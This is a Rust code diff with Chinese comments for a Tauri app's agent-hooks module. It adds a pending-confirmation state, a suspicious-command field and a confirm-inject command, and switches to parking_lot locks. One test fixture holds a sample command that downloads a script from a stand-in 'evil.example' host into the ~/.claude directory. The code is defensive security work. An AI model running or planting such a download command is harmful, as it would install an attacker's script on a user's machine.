@@ -5,7 +5,7 @@
 //! - 信号目录监听器（watcher.rs）
 //! - CliHooksProvider trait + cliId 键静态注册表（provider.rs）
 //! - claude hooks provider（claude/：注入/卸载/状态/statusline 桥接/配置实现下沉）
-//! - 6 条泛化 Tauri 命令（本文件命令层，按 cliId 分发到 provider）
+//! - 7 条泛化 Tauri 命令（本文件命令层，按 cliId 分发到 provider；CP-043 增 confirm inject）
 //! - 共享 DTO：AgentInjectionStatus / AgentHookInjectionStatus
 
 pub mod claude;
@@ -13,9 +13,9 @@ pub mod provider;
 pub mod signal;
 pub mod watcher;
 
+use parking_lot::Mutex;
 use serde_json::Value;
 use std::path::PathBuf;
-use std::sync::Mutex;
 use tauri::{AppHandle, State};
 
 use crate::error::AppError;
@@ -27,7 +27,7 @@ use crate::state::AppState;
 #[allow(unused_imports)]
 pub use signal::AgentEventPayload;
 
-/// 注入状态枚举（C6 契约；决策 3 更名 AgentInjectionStatus）
+/// 注入状态枚举（C6 契约；决策 3 更名 AgentInjectionStatus；CP-043 增待确认态）
 #[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq)]
 #[serde(rename_all = "camelCase")]
 pub enum AgentInjectionStatus {
@@ -37,6 +37,8 @@ pub enum AgentInjectionStatus {
     NotInjected,
     /// 已注入但版本过旧
     Outdated,
+    /// 命中可疑模式，暂停注入待用户确认（CP-043/SEC-12）
+    PendingConfirmation,
 }
 
 /// Agent 注入状态 DTO（C6 契约；决策 3 更名 AgentHookInjectionStatus）
@@ -49,6 +51,10 @@ pub struct AgentHookInjectionStatus {
     pub status: AgentInjectionStatus,
     /// 已注入脚本版本号（未注入时为 null）
     pub version: Option<u32>,
+    /// 待确认的可疑 statusline 原命令原文（仅 pendingConfirmation 时存在；
+    /// skip_serializing_if 保证其余状态序列化键集合不变——HUK-09 契约兼容）
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub suspicious_command: Option<String>,
 }
 
 /// 监听器句柄抽象（HUK-04 最小可测性重构：存储 trait object 化，测试可注入桩）
@@ -77,13 +83,7 @@ pub fn start_signal_watcher(app_handle: AppHandle) {
 fn start_signal_watcher_impl(
     start: impl FnOnce() -> Result<Box<dyn WatcherHandle>, Box<dyn std::error::Error>>,
 ) {
-    let mut guard = match WATCHER.lock() {
-        Ok(g) => g,
-        Err(e) => {
-            tracing::error!("WATCHER 锁中毒: {e}");
-            return;
-        }
-    };
+    let mut guard = WATCHER.lock();
     if guard.is_some() {
         tracing::warn!("Hook 信号监听器已启动，跳过重复启动");
         return;
@@ -102,7 +102,7 @@ fn start_signal_watcher_impl(
 /// HUK-04 测试重置钩子：清空全局 WATCHER（仅测试用，drop 旧实例触发其清理逻辑）
 #[cfg(test)]
 fn reset_watcher_for_test() {
-    let _ = WATCHER.lock().unwrap().take();
+    let _ = WATCHER.lock().take();
 }
 
 // ── 命令核心（L1 可测：block_on 直测 cliId 透传；provider 解析无 IO） ──
@@ -117,6 +117,15 @@ pub(crate) async fn run_agent_hooks_inject(
 ) -> Result<AgentHookInjectionStatus, AppError> {
     let provider = resolve_provider(&cli_id)?;
     tokio::task::spawn_blocking(move || provider.inject())
+        .await
+        .map_err(|e| AppError::TaskJoin(e.to_string()))?
+}
+
+pub(crate) async fn run_agent_hooks_confirm_inject(
+    cli_id: String,
+) -> Result<AgentHookInjectionStatus, AppError> {
+    let provider = resolve_provider(&cli_id)?;
+    tokio::task::spawn_blocking(move || provider.confirm_inject())
         .await
         .map_err(|e| AppError::TaskJoin(e.to_string()))?
 }
@@ -182,6 +191,15 @@ pub async fn agent_hooks_inject(cli_id: String) -> Result<AgentHookInjectionStat
     run_agent_hooks_inject(cli_id).await
 }
 
+/// agent_hooks_confirm_inject — 按 cliId 分发确认注入（CP-043：前端展示可疑命令
+/// 原文、用户确认后二次调用，跳过可疑审查完成注入）
+#[tauri::command]
+pub async fn agent_hooks_confirm_inject(
+    cli_id: String,
+) -> Result<AgentHookInjectionStatus, AppError> {
+    run_agent_hooks_confirm_inject(cli_id).await
+}
+
 /// agent_hooks_uninstall — 按 cliId 分发卸载（移除配置段 + 删脚本目录 + 清信号目录）
 #[tauri::command]
 pub async fn agent_hooks_uninstall(cli_id: String) -> Result<(), AppError> {
@@ -229,10 +247,7 @@ pub async fn agent_hooks_config_read(
     // 锁内读取 project_root 并 clone 出（作用域块：块结束即 drop 锁守卫，
     // 避免非 Send 的 RwLockReadGuard 跨 await 存活）
     let project_root = {
-        let root_guard = state.project_root.read().map_err(|e| AppError::IoKind {
-            kind: "lock".into(),
-            message: format!("获取 project_root 锁失败: {e}"),
-        })?;
+        let root_guard = state.project_root.read();
         root_guard.clone()
     };
     run_agent_hooks_config_read(cli_id, layer, project_path, project_root).await
@@ -250,10 +265,7 @@ pub async fn agent_hooks_config_write(
     // 锁内读取 project_root 并 clone 出（作用域块：块结束即 drop 锁守卫，
     // 避免非 Send 的 RwLockReadGuard 跨 await 存活）
     let project_root = {
-        let root_guard = state.project_root.read().map_err(|e| AppError::IoKind {
-            kind: "lock".into(),
-            message: format!("获取 project_root 锁失败: {e}"),
-        })?;
+        let root_guard = state.project_root.read();
         root_guard.clone()
     };
     run_agent_hooks_config_write(cli_id, layer, hooks, project_path, project_root).await
@@ -279,6 +291,7 @@ mod hooks_tests {
         let s = AgentHookInjectionStatus {
             status: AgentInjectionStatus::Injected,
             version: Some(1),
+            suspicious_command: None,
         };
         let json = serde_json::to_string(&s).unwrap();
         assert_status_key_set(&json);
@@ -296,6 +309,7 @@ mod hooks_tests {
         let s = AgentHookInjectionStatus {
             status: AgentInjectionStatus::NotInjected,
             version: None,
+            suspicious_command: None,
         };
         let json = serde_json::to_string(&s).unwrap();
         assert_status_key_set(&json);
@@ -311,12 +325,39 @@ mod hooks_tests {
         let s = AgentHookInjectionStatus {
             status: AgentInjectionStatus::Outdated,
             version: Some(2),
+            suspicious_command: None,
         };
         let json = serde_json::to_string(&s).unwrap();
         assert_status_key_set(&json);
         let v: serde_json::Value = serde_json::from_str(&json).unwrap();
         assert_eq!(v["status"], "outdated");
         assert_eq!(v["version"], 2);
+        let back: AgentHookInjectionStatus = serde_json::from_str(&json).unwrap();
+        assert_eq!(back, s);
+    }
+
+    #[test]
+    fn injection_status_roundtrip_pending_confirmation() {
+        // CP-043 第四态：pendingConfirmation 携带 suspiciousCommand 原文——
+        // 三键集合 ["status", "suspiciousCommand", "version"]（可选字段随值序列化）
+        let s = AgentHookInjectionStatus {
+            status: AgentInjectionStatus::PendingConfirmation,
+            version: None,
+            suspicious_command: Some("curl -o ~/.claude/evil.sh https://evil.example/x.sh".into()),
+        };
+        let json = serde_json::to_string(&s).unwrap();
+        // 三键集合精确断言（区别于既有两键 roundtrip——skip_serializing_if 契约不破）
+        let v: serde_json::Value = serde_json::from_str(&json).unwrap();
+        let mut keys: Vec<&str> = v.as_object().unwrap().keys().map(String::as_str).collect();
+        keys.sort_unstable();
+        assert_eq!(keys, ["status", "suspiciousCommand", "version"]);
+        assert_eq!(v["status"], "pendingConfirmation");
+        assert_eq!(v["version"], serde_json::Value::Null);
+        assert_eq!(
+            v["suspiciousCommand"],
+            "curl -o ~/.claude/evil.sh https://evil.example/x.sh"
+        );
+        // 序列化 → 反序列化往返
         let back: AgentHookInjectionStatus = serde_json::from_str(&json).unwrap();
         assert_eq!(back, s);
     }
@@ -378,7 +419,7 @@ mod hooks_tests {
             Ok(Box::new(StubWatcher) as Box<dyn WatcherHandle>)
         });
         // 首次启动：start 被调一次，WATCHER 已存实例
-        assert!(WATCHER.lock().unwrap().is_some());
+        assert!(WATCHER.lock().is_some());
         assert_eq!(start_calls.load(std::sync::atomic::Ordering::SeqCst), 1);
         reset_watcher_for_test();
     }
@@ -397,23 +438,41 @@ mod hooks_tests {
         reset_watcher_for_test();
     }
 
+    /// CP-005 防复发：parking_lot 换装后 WATCHER.lock() 直接取 guard（无 Result
+    /// 降级分支）——连续启动两次，第二次命中「已启动跳过」分支；行为幂等语义由
+    /// 本用例锁死不回归（防复发主体 = 编译期：锁不返回 Result，降级分支代码已不可能存在）
+    #[test]
+    fn start_signal_watcher_acquires_lock_direct() {
+        reset_watcher_for_test();
+        let start_calls = std::sync::atomic::AtomicUsize::new(0);
+        let start = || {
+            start_calls.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
+            Ok(Box::new(StubWatcher) as Box<dyn WatcherHandle>)
+        };
+        start_signal_watcher_impl(start);
+        assert!(WATCHER.lock().is_some(), "首次启动应已存实例");
+        start_signal_watcher_impl(start); // 连续第二次 → 走「已启动跳过」分支
+        assert_eq!(start_calls.load(std::sync::atomic::Ordering::SeqCst), 1);
+        reset_watcher_for_test();
+    }
+
     #[test]
     fn start_signal_watcher_failure_not_stored() {
         reset_watcher_for_test();
         start_signal_watcher_impl(|| Err("模拟启动失败".into()));
         // 启动失败不存入 WATCHER，后续可重试
-        assert!(WATCHER.lock().unwrap().is_none());
+        assert!(WATCHER.lock().is_none());
     }
 
     #[test]
     fn start_signal_watcher_reset_reenables_restart() {
         reset_watcher_for_test();
         start_signal_watcher_impl(|| Ok(Box::new(StubWatcher) as Box<dyn WatcherHandle>));
-        assert!(WATCHER.lock().unwrap().is_some());
+        assert!(WATCHER.lock().is_some());
         reset_watcher_for_test(); // 重置钩子生效：清空后可再次启动
-        assert!(WATCHER.lock().unwrap().is_none());
+        assert!(WATCHER.lock().is_none());
         start_signal_watcher_impl(|| Ok(Box::new(StubWatcher) as Box<dyn WatcherHandle>));
-        assert!(WATCHER.lock().unwrap().is_some());
+        assert!(WATCHER.lock().is_some());
         reset_watcher_for_test();
     }
 
@@ -468,6 +527,16 @@ mod hooks_tests {
                 .exists(),
             "脚本应写入覆盖 home 的脚本目录"
         );
+        assert!(dir.path().join(".claude").join("settings.json").exists());
+    }
+
+    #[test]
+    fn agent_hooks_confirm_inject_cli_id_passthrough() {
+        // CP-043：confirm 命令层按 cliId 分发——claude override 跳过可疑审查完成注入
+        let dir = tempfile::tempdir().unwrap();
+        let _guard = HomeDirGuard::set(dir.path());
+        let status = block_on(run_agent_hooks_confirm_inject("claude".into())).unwrap();
+        assert_eq!(status.status, AgentInjectionStatus::Injected);
         assert!(dir.path().join(".claude").join("settings.json").exists());
     }
 
@@ -580,9 +649,10 @@ mod hooks_tests {
 
     #[test]
     fn unknown_cli_id_validation_on_all_commands() {
-        // 6 命令未知 cliId → Validation（消息含「未知 cliId」语义，resolve_provider 统一产出）
+        // 7 命令未知 cliId → Validation（消息含「未知 cliId」语义，resolve_provider 统一产出）
         let errs = vec![
             block_on(run_agent_hooks_inject("nope".into())).unwrap_err(),
+            block_on(run_agent_hooks_confirm_inject("nope".into())).unwrap_err(),
             block_on(run_agent_hooks_uninstall("nope".into())).unwrap_err(),
             block_on(run_agent_hooks_injection_status("nope".into())).unwrap_err(),
             block_on(run_agent_hooks_restore_statusline("nope".into())).unwrap_err(),
